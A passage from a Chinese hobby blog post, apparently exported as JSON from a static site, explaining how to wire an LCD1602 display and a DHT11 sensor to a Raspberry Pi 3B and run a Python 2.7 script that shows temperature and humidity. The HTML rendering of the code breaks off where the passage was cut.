10\nD0，数据位0，4位工作模式下不用，不接\nD1，数据位1，4位工作模式下不用，不接\nD2，数据位2，4位工作模式下不用，不接\nD3，数据位3，4位工作模式下不用，不接\nD4，数据位4，接GPIO 17，RPi PIN 11\nD5，数据位5，接GPIO 18，RPi PIN 12\nD6，数据位6，接GPIO 27，RPi PIN 13\nD7，数据位7，接GPIO 22，RPi PIN 15\nA，液晶屏背光+，接5V，RPi PIN 4\nK，液晶屏背光-，接地，RPi PIN 39\n\n**连接好后，务必要仔细检查是否连接正确，以防开机烧坏GPIO甚至树莓派。**\n\n建议在关机情况下接线，如果在开机情况下接线，VDD请最后连接。\n\n## LCD1602 开机测试\n接通电源线，默认情况下，如果连接正确：\n\n* 肯定没有爆炸\n* 会出现如下图的效果，证明你已经接线成功了\n![](/content/images/2016/08/1.jpg)\n\n## DHT11 接线方案\n接线简单，主要是把数据传输到GPIO26上\n\nDHT11有3个脚，VCC，DATA，GND\nVCC 接 3.3V PIN 01\nDATA 接 GPIO26 PIN 37\nGND 接地  PIN 09\n\n#代码\n采用python语言编写，由于html对tab和空格的支持不好，复制容易产生编译问题，代码已经传到github\n\nhttps://github.com/yfgeek/rpi-TmpHmdRuntime\n```python\n#!/usr/bin/python\n\n# based on code from hugozhu/CharLCD.py https://gist.github.com/hugozhu/6166527\n# rewrite by ivan\n\nfrom time import sleep\nfrom datetime import datetime\nfrom time import sleep\nimport commands,time\nimport RPi.GPIO as GPIO\n\ndef get_tmp():\n  channel = 37\n  data = []\n  j = 0\n\n  GPIO.setmode(GPIO.BOARD)\n\n  time.sleep(1)\n\n  GPIO.setup(channel, GPIO.OUT)\n  GPIO.output(channel, GPIO.LOW)\n  time.sleep(0.5)\n  GPIO.output(channel, GPIO.HIGH)\n  GPIO.setup(channel, GPIO.IN)\n\n  while GPIO.input(channel) == GPIO.LOW:\n    continue\n  while GPIO.input(channel) == GPIO.HIGH:\n    continue\n\n  while j < 40:\n    k = 0\n    while GPIO.input(channel) == GPIO.LOW:\n      continue\n    while GPIO.input(channel) == GPIO.HIGH:\n      k += 1\n      if k > 100:\n        break\n    if k < 8:\n      data.append(0)\n    else:\n      data.append(1)\n\n    j += 1\n\n  print \"sensor is working.\"\n  print data\n\n  humidity_bit = data[0:8]\n  humidity_point_bit = data[8:16]\n  temperature_bit = data[16:24]\n  temperature_point_bit = data[24:32]\n  check_bit = data[32:40]\n\n  humidity = 0\n  humidity_point = 0\n  temperature = 0\n  temperature_point = 0\n  check = 0\n\n  for i in range(8):\n    humidity += humidity_bit[i] * 2 ** (7-i)\n    humidity_point += humidity_point_bit[i] * 2 ** (7-i)\n    temperature += temperature_bit[i] * 2 ** (7-i)\n    temperature_point += temperature_point_bit[i] * 2 ** (7-i)\n    check += check_bit[i] * 2 ** (7-i)\n\n  tmp = humidity + humidity_point + temperature + temperature_point\n\n  if check == tmp:\n    return 'temp:' + str(temperature) + ' C \\nhumidity:' + str(humidity) + '%'\n  else:\n    get_tmp()\n\n  GPIO.cleanup()    \n\nclass Adafruit_CharLCD:\n\n    # commands\n    LCD_CLEARDISPLAY            = 0x01\n    LCD_RETURNHOME                  = 0x02\n    LCD_ENTRYMODESET            = 0x04\n    LCD_DISPLAYCONTROL          = 0x08\n    LCD_CURSORSHIFT             = 0x10\n    LCD_FUNCTIONSET             = 0x20\n    LCD_SETCGRAMADDR            = 0x40\n    LCD_SETDDRAMADDR            = 0x80\n\n    # flags for display entry mode\n    LCD_ENTRYRIGHT              = 0x00\n    LCD_ENTRYLEFT               = 0x02\n    LCD_ENTRYSHIFTINCREMENT     = 0x01\n    LCD_ENTRYSHIFTDECREMENT     = 0x00\n\n    # flags for display on/off control\n    LCD_DISPLAYON               = 0x04\n    LCD_DISPLAYOFF              = 0x00\n    LCD_CURSORON                = 0x02\n    LCD_CURSOROFF               = 0x00\n    LCD_BLINKON                 = 0x01\n    LCD_BLINKOFF                = 0x00\n\n    # flags for display/cursor shift\n    LCD_DISPLAYMOVE             = 0x08\n    LCD_CURSORMOVE              = 0x00\n\n    # flags for display/cursor shift\n    LCD_DISPLAYMOVE             = 0x08\n    LCD_CURSORMOVE              = 0x00\n    LCD_MOVERIGHT               = 0x04\n    LCD_MOVELEFT                = 0x00\n\n    # flags for function set\n    LCD_8BITMODE                = 0x10\n    LCD_4BITMODE                = 0x00\n    LCD_2LINE                   = 0x08\n    LCD_1LINE                   = 0x00\n    LCD_5x10DOTS                = 0x04\n    LCD_5x8DOTS                 = 0x00\n\n\n\n    def __init__(self, pin_rs=8, pin_e=10, pins_db=[11,12,13,15], GPIO = None):\n        # Emulate the old behavior of using RPi.GPIO if we haven't been given\n        # an explicit GPIO interface to use\n        if not GPIO:\n            import RPi.GPIO as GPIO\n        GPIO.setwarnings(False)\n\n        self.GPIO = GPIO\n        self.pin_rs = pin_rs\n        self.pin_e = pin_e\n        self.pins_db = pins_db\n\n        self.GPIO.setmode(GPIO.BOARD)\n        self.GPIO.setup(self.pin_e, GPIO.OUT)\n        self.GPIO.setup(self.pin_rs, GPIO.OUT)\n\n        for pin in self.pins_db:\n            self.GPIO.setup(pin, GPIO.OUT)\n\n        self.write4bits(0x33) # initialization\n        self.write4bits(0x32) # initialization\n        self.write4bits(0x28) # 2 line 5x7 matrix\n        self.write4bits(0x0C) # turn cursor off 0x0E to enable cursor\n        self.write4bits(0x06) # shift cursor right\n\n        self.displaycontrol = self.LCD_DISPLAYON | self.LCD_CURSOROFF | self.LCD_BLINKOFF\n\n        self.displayfunction = self.LCD_4BITMODE | self.LCD_1LINE | self.LCD_5x8DOTS\n        self.displayfunction |= self.LCD_2LINE\n\n        \"\"\" Initialize to default text direction (for romance languages) \"\"\"\n        self.displaymode =  self.LCD_ENTRYLEFT | self.LCD_ENTRYSHIFTDECREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) #  set the entry mode\n\n        self.clear()\n\n\n    def begin(self, cols, lines):\n\n        if (lines > 1):\n                self.numlines = lines\n                self.displayfunction |= self.LCD_2LINE\n                self.currline = 0\n\n\n    def home(self):\n\n        self.write4bits(self.LCD_RETURNHOME) # set cursor position to zero\n        self.delayMicroseconds(3000) # this command takes a long time!\n\n\n    def clear(self):\n\n        self.write4bits(self.LCD_CLEARDISPLAY) # command to clear display\n        self.delayMicroseconds(3000)    # 3000 microsecond sleep, clearing the display takes a long time\n\n\n    def setCursor(self, col, row):\n\n        self.row_offsets = [ 0x00, 0x40, 0x14, 0x54 ]\n\n        if ( row > self.numlines ): \n                row = self.numlines - 1 # we count rows starting w/0\n\n        self.write4bits(self.LCD_SETDDRAMADDR | (col + self.row_offsets[row]))\n\n\n    def noDisplay(self): \n        \"\"\" Turn the display off (quickly) \"\"\"\n\n        self.displaycontrol &= ~self.LCD_DISPLAYON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def display(self):\n        \"\"\" Turn the display on (quickly) \"\"\"\n\n        self.displaycontrol |= self.LCD_DISPLAYON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noCursor(self):\n        \"\"\" Turns the underline cursor on/off \"\"\"\n\n        self.displaycontrol &= ~self.LCD_CURSORON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def cursor(self):\n        \"\"\" Cursor On \"\"\"\n\n        self.displaycontrol |= self.LCD_CURSORON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noBlink(self):\n        \"\"\" Turn on and off the blinking cursor \"\"\"\n\n        self.displaycontrol &= ~self.LCD_BLINKON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noBlink(self):\n        \"\"\" Turn on and off the blinking cursor \"\"\"\n\n        self.displaycontrol &= ~self.LCD_BLINKON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def DisplayLeft(self):\n        \"\"\" These commands scroll the display without changing the RAM \"\"\"\n\n        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVELEFT)\n\n\n    def scrollDisplayRight(self):\n        \"\"\" These commands scroll the display without changing the RAM \"\"\"\n\n        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVERIGHT);\n\n\n    def leftToRight(self):\n        \"\"\" This is for text that flows Left to Right \"\"\"\n\n        self.displaymode |= self.LCD_ENTRYLEFT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode);\n\n\n    def rightToLeft(self):\n        \"\"\" This is for text that flows Right to Left \"\"\"\n        self.displaymode &= ~self.LCD_ENTRYLEFT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def autoscroll(self):\n        \"\"\" This will 'right justify' text from the cursor \"\"\"\n\n        self.displaymode |= self.LCD_ENTRYSHIFTINCREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def noAutoscroll(self): \n        \"\"\" This will 'left justify' text from the cursor \"\"\"\n\n        self.displaymode &= ~self.LCD_ENTRYSHIFTINCREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def write4bits(self, bits, char_mode=False):\n        \"\"\" Send command to LCD \"\"\"\n\n        self.delayMicroseconds(1000) # 1000 microsecond sleep\n\n        bits=bin(bits)[2:].zfill(8)\n\n        self.GPIO.output(self.pin_rs, char_mode)\n\n        for pin in self.pins_db:\n            self.GPIO.output(pin, False)\n\n        for i in range(4):\n            if bits[i] == \"1\":\n                self.GPIO.output(self.pins_db[::-1][i], True)\n\n        self.pulseEnable()\n\n        for pin in self.pins_db:\n            self.GPIO.output(pin, False)\n\n        for i in range(4,8):\n            if bits[i] == \"1\":\n                self.GPIO.output(self.pins_db[::-1][i-4], True)\n\n        self.pulseEnable()\n\n\n    def delayMicroseconds(self, microseconds):\n        seconds = microseconds / float(1000000) # divide microseconds by 1 million for seconds\n        sleep(seconds)\n\n\n    def pulseEnable(self):\n        self.GPIO.output(self.pin_e, False)\n        self.delayMicroseconds(1)               # 1 microsecond pause - enable pulse must be > 450ns \n        self.GPIO.output(self.pin_e, True)\n        self.delayMicroseconds(1)               # 1 microsecond pause - enable pulse must be > 450ns \n        self.GPIO.output(self.pin_e, False)\n        self.delayMicroseconds(1)               # commands need > 37us to settle\n\n\n    def message(self, text):\n        \"\"\" Send string to LCD. Newline wraps to second line\"\"\"\n\n        for char in text:\n            if char == '\\n':\n                self.write4bits(0xC0) # next line\n            else:\n                self.write4bits(ord(char),True)\n\nif __name__ == '__main__':\n\n    while True:\n        tmp = get_tmp() \n        if tmp:\n            lcd = Adafruit_CharLCD()\n            lcd.noBlink()\n            lcd.clear()\n            lcd.message(tmp)\n        sleep(5)\n\n```\n# 运行效果\n![](/content/images/2016/08/WechatIMG302.jpeg)\n\n\n![](/content/images/2016/08/WechatIMG293.jpeg)\n# 参考资料\nhttps://gist.github.com/hugozhu/6166527\nhttps://github.com/adafruit/Adafruit-Raspberry-Pi-Python-Code/tree/2d4678fdccec1b93d8d69ba7768f6698545b2c5f\nhttps://github.com/op2-project/op2-daemon/blob/master/op2d/hal/backend/pihelpers/lcd.py\nhttp://blog.csdn.net/xukai871105/article/details/12684617\nhttps://www.oschina.net/question/1425530\\_140979\nhttp://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html\nhttp://blog.csdn.net/netccy/article/details/48098455\nhttps://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html\nhttp://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html\nhttp://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html\nhttp://blog.csdn.net/rocklee/article/details/50082777\nhttp://www.guokr.com/post/718305/\nhttp://www.rs-online.com/designspark/electronics/blog/content-1148\nhttp://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html\nhttps://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml\nhttp://blog.csdn.net/u013431550/article/details/40870947\nhttp://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba\nhttp://blog.csdn.net/longerzone/article/details/36171381","slug":"rpi-tmp-hdt-platform","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiskal00143sonz4gv8qip","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。</p>\n<p>在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。<br><a id=\"more\"></a> </p>\n<h1 id=\"知识储备\"><a href=\"#知识储备\" class=\"headerlink\" title=\"知识储备\"></a>知识储备</h1><ul>\n<li>数字电子技术基础</li>\n<li>微机原理与接口技术</li>\n<li>python语言</li>\n</ul>\n<h1 id=\"原料\"><a href=\"#原料\" class=\"headerlink\" title=\"原料\"></a>原料</h1><ul>\n<li>树莓派3B</li>\n<li>DHT11</li>\n<li>LCD1602</li>\n<li>2K电阻（也可以是电位器）</li>\n<li>子-母 和 母-母 杜邦线</li>\n<li>电气绝缘胶带</li>\n<li>剪刀</li>\n<li>一颗耐心和一颗细心</li>\n</ul>\n<h1 id=\"语言\"><a href=\"#语言\" class=\"headerlink\" title=\"语言\"></a>语言</h1><ul>\n<li>Python 2.7</li>\n</ul>\n<h1 id=\"组件\"><a href=\"#组件\" class=\"headerlink\" title=\"组件\"></a>组件</h1><ul>\n<li>python-dev</li>\n<li>python-rpi.gpio<br>如果不具备以上，请执行：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install python-dev</div><div class=\"line\">sudo apt-get install python-rpi.gpio</div></pre></td></tr></table></figure>\n</li>\n</ul>\n<h1 id=\"接线\"><a href=\"#接线\" class=\"headerlink\" title=\"接线\"></a>接线</h1><p>我们一共要完成两个任务：</p>\n<ul>\n<li>1.连接LCD1602</li>\n<li>2.连接DHT11</li>\n</ul>\n<p>树莓派3B的GPIO图如下：</p>\n<p><img src=\"/content/images/2016/08/GPIO.png\" alt=\"\"></p>\n<h2 id=\"2K-电阻如何连接到电路\"><a href=\"#2K-电阻如何连接到电路\" class=\"headerlink\" title=\"2K 电阻如何连接到电路\"></a>2K 电阻如何连接到电路</h2><p>简单粗暴的方法就是把电阻两头连接到两个子-母杜邦线上，然后用绝缘胶布缠上，非常方便美观。</p>\n<h2 id=\"LCD1602-接线方案\"><a href=\"#LCD1602-接线方案\" class=\"headerlink\" title=\"LCD1602 接线方案\"></a>LCD1602 接线方案</h2><p>LCD 与 树莓派相连 方案图，2K电阻是我自行设计，如果有电位器最好放置电位器：<br><img src=\"/content/images/2016/08/LCD1602--.jpg\" alt=\"\"></p>\n<p>树莓派的USB端口朝下，电源线位置朝上方向摆放。<br>右端一共有40个引脚，每个引脚的PIN位置如上。</p>\n<p>VSS，接地，RPi PIN 6<br>VDD，接5V电源，PRi PIN 2<br>VO，液晶对比度调节，接1K 电阻，另一端相连接地，PIN 9<br>RS，寄存器选择，接GPIO 14，RPi PIN 8<br>RW，读写选择，接地，表示写模式，PRi PIN 6<br>E，使能信号，接GPIO 15，RPi PIN 10<br>D0，数据位0，4位工作模式下不用，不接<br>D1，数据位1，4位工作模式下不用，不接<br>D2，数据位2，4位工作模式下不用，不接<br>D3，数据位3，4位工作模式下不用，不接<br>D4，数据位4，接GPIO 17，RPi PIN 11<br>D5，数据位5，接GPIO 18，RPi PIN 12<br>D6，数据位6，接GPIO 27，RPi PIN 13<br>D7，数据位7，接GPIO 22，RPi PIN 15<br>A，液晶屏背光+，接5V，RPi PIN 4<br>K，液晶屏背光-，接地，RPi PIN 39</p>\n<p><strong>连接好后，务必要仔细检查是否连接正确，以防开机烧坏GPIO甚至树莓派。</strong></p>\n<p>建议在关机情况下接线，如果在开机情况下接线，VDD请最后连接。</p>\n<h2 id=\"LCD1602-开机测试\"><a href=\"#LCD1602-开机测试\" class=\"headerlink\" title=\"LCD1602 开机测试\"></a>LCD1602 开机测试</h2><p>接通电源线，默认情况下，如果连接正确：</p>\n<ul>\n<li>肯定没有爆炸</li>\n<li>会出现如下图的效果，证明你已经接线成功了<br><img src=\"/content/images/2016/08/1.jpg\" alt=\"\"></li>\n</ul>\n<h2 id=\"DHT11-接线方案\"><a href=\"#DHT11-接线方案\" class=\"headerlink\" title=\"DHT11 接线方案\"></a>DHT11 接线方案</h2><p>接线简单，主要是把数据传输到GPIO26上</p>\n<p>DHT11有3个脚，VCC，DATA，GND<br>VCC 接 3.3V PIN 01<br>DATA 接 GPIO26 PIN 37<br>GND 接地  PIN 09</p>\n<p>#代码<br>采用python语言编写，由于html对tab和空格的支持不好，复制容易产生编译问题，代码已经传到github</p>\n<p><a href=\"https://github.com/yfgeek/rpi-TmpHmdRuntime\" target=\"_blank\" rel=\"external\">https://github.com/yfgeek/rpi-TmpHmdRuntime</a><br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div><div class=\"line\">202</div><div class=\"line\">203</div><div class=\"line\">204</div><div class=\"line\">205</div><div class=\"line\">206</div><div class=\"line\">207</div><div class=\"line\">208</div><div class=\"line\">209</div><div class=\"line\">210</div><div class=\"line\">211</div><div class=\"line\">212</div><div class=\"line\">213</div><div class=\"line\">214</div><div class=\"line\">215</div><div class=\"line\">216</div><div class=\"line\">217</div><div class=\"line\">218</div><div class=\"line\">219</div><div class=\"line\">220</div><div class=\"line\">221</div><div class=\"line\">222</div><div class=\"line\">223</div><div class=\"line\">224</div><div class=\"line\">225</div><div class=\"line\">226</div><div class=\"line\">227</div><div class=\"line\">228</div><div class=\"line\">229</div><div class=\"line\">230</div><div class=\"line\">231</div><div class=\"line\">232</div><div class=\"line\">233</div><div class=\"line\">234</div><div class=\"line\">235</div><div class=\"line\">236</div><div class=\"line\">237</div><div class=\"line\">238</div><div class=\"line\">239</div><div class=\"line\">240</div><div class=\"line\">241</div><div class=\"line\">242</div><div class=\"line\">243</div><div class=\"line\">244</div><div class=\"line\">245</div><div class=\"line\">246</div><div class=\"line\">247</div><div class=\"line\">248</div><div class=\"line\">249</div><div class=\"line\">250</div><div class=\"line\">251</div><div class=\"line\">252</div><div class=\"line\">253</div><div class=\"line\">254</div><div class=\"line\">255</div><div class=\"line\">256</div><div class=\"line\">257</div><div class=\"line\">258</div><div class=\"line\">259</div><div class=\"line\">260</div><div class=\"line\">261</div><div class=\"line\">262</div><div class=\"line\">263</div><div class=\"line\">264</div><div class=\"line\">265</div><div class=\"line\">266</div><div class=\"line\">267</div><div class=\"line\">268</div><div class=\"line\">269</div><div class=\"line\">270</div><div class=\"line\">271</div><div class=\"line\">272</div><div class=\"line\">273</div><div class=\"line\">274</div><div class=\"line\">275</div><div class=\"line\">276</div><div class=\"line\">277</div><div class=\"line\">278</div><div class=\"line\">279</div><div class=\"line\">280</div><div class=\"line\">281</div><div class=\"line\">282</div><div class=\"line\">283</div><div class=\"line\">284</div><div class=\"line\">285</div><div class=\"line\">286</div><div class=\"line\">287</div><div class=\"line\">288</div><div class=\"line\">289</div><div class=\"line\">290</div><div class=\"line\">291</div><div class=\"line\">292</div><div class=\"line\">293</div><div class=\"line\">294</div><div class=\"line\">295</div><div class=\"line\">296</div><div class=\"line\">297</div><div class=\"line\">298</div><div class=\"line\">299</div><div class=\"line\">300</div><div class=\"line\">301</div><div class=\"line\">302</div><div class=\"line\">303</div><div class=\"line\">304</div><div class=\"line\">305</div><div class=\"line\">306</div><div class=\"line\">307</div><div class=\"line\">308</div><div class=\"line\">309</div><div class=\"line\">310</div><div class=\"line\">311</div><div class=\"line\">312</div><div class=\"line\">313</div><div class=\"line\">314</div><div class=\"line\">315</div><div class=\"line\">316</div><div class=\"line\">317</div><div class=\"line\">318</div><div class=\"line\">319</div><div class=\"line\">320</div><div class=\"line\">321</div><div class=\"line\">322</div><div class=\"line\">323</div><div class=\"line\">324</div><div class=\"line\">325</div><div class=\"line\">326</div><div class=\"line\">327</div><div class=\"line\">328</div><div class=\"line\">329</div><div class=\"line\">330</div><div class=\"line\">331</div><div class=\"line\">332</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># based on code from hugozhu/CharLCD.py https://gist.github.com/hugozhu/6166527</span></div><div class=\"line\"><span class=\"comment\"># rewrite by ivan</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</div><div class=\"line\"><span class=\"keyword\">from</span> datetime <span class=\"keyword\">import</span> datetime</div><div class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</div><div class=\"line\"><span class=\"keyword\">import</span> commands,time</div><div class=\"line\"><span class=\"keyword\">import</span> RPi.GPIO <span class=\"keyword\">as</span> GPIO</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_tmp</span><span class=\"params\">()</span>:</span></div><div class=\"line\">  channel = <span class=\"number\">37</span></div><div class=\"line\">  data = []</div><div class=\"line\">  j = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">  GPIO.setmode(GPIO.BOARD)</div><div class=\"line\"></div><div class=\"line\">  time.sleep(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">  GPIO.setup(channel, GPIO.OUT)</div><div class=\"line\">  GPIO.output(channel, GPIO.LOW)</div><div class=\"line\">  time.sleep(<span class=\"number\">0.5</span>)</div><div class=\"line\">  GPIO.output(channel, GPIO.HIGH)</div><div class=\"line\">  GPIO.setup(channel, GPIO.IN)</div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class=\"line\">    <span class=\"keyword\">continue</span></div><div class=\"line\">  <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class=\"line\">    <span class=\"keyword\">continue</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">while</span> j &lt; <span class=\"number\">40</span>:</div><div class=\"line\">    k = <span class=\"number\">0</span></div><div class=\"line\">    <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.LOW:</div><div class=\"line\">      <span class=\"keyword\">continue</span></div><div class=\"line\">    <span class=\"keyword\">while</span> GPIO.input(channel) == GPIO.HIGH:</div><div class=\"line\">      k += <span class=\"number\">1</span></div><div class=\"line\">      <span class=\"keyword\">if</span> k &gt; <span class=\"number\">100</span>:</div><div class=\"line\">        <span class=\"keyword\">break</span></div><div class=\"line\">    <span class=\"keyword\">if</span> k &lt; <span class=\"number\">8</span>:</div><div class=\"line\">      data.append(<span class=\"number\">0</span>)</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">      data.append(<span class=\"number\">1</span>)</div><div class=\"line\"></div><div class=\"line\">    j += <span class=\"number\">1</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">print</span> <span class=\"string\">\"sensor is working.\"</span></div><div class=\"line\">  <span class=\"keyword\">print</span> data</div><div class=\"line\"></div><div class=\"line\">  humidity_bit = data[<span class=\"number\">0</span>:<span class=\"number\">8</span>]</div><div class=\"line\">  humidity_point_bit = data[<span class=\"number\">8</span>:<span class=\"number\">16</span>]</div><div class=\"line\">  temperature_bit = data[<span class=\"number\">16</span>:<span class=\"number\">24</span>]</div><div class=\"line\">  temperature_point_bit = data[<span class=\"number\">24</span>:<span class=\"number\">32</span>]</div><div class=\"line\">  check_bit = data[<span class=\"number\">32</span>:<span class=\"number\">40</span>]</div><div class=\"line\"></div><div class=\"line\">  humidity = <span class=\"number\">0</span></div><div class=\"line\">  humidity_point = <span class=\"number\">0</span></div><div class=\"line\">  temperature = <span class=\"number\">0</span></div><div class=\"line\">  temperature_point = <span class=\"number\">0</span></div><div class=\"line\">  check = <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>):</div><div class=\"line\">    humidity += humidity_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    humidity_point += humidity_point_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    temperature += temperature_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    temperature_point += temperature_point_bit[i] * <span class=\"number\">2</span> ** (<span class=\"number\">7</span>-i)</div><div class=\"line\">    check += check_bit[i] * <span 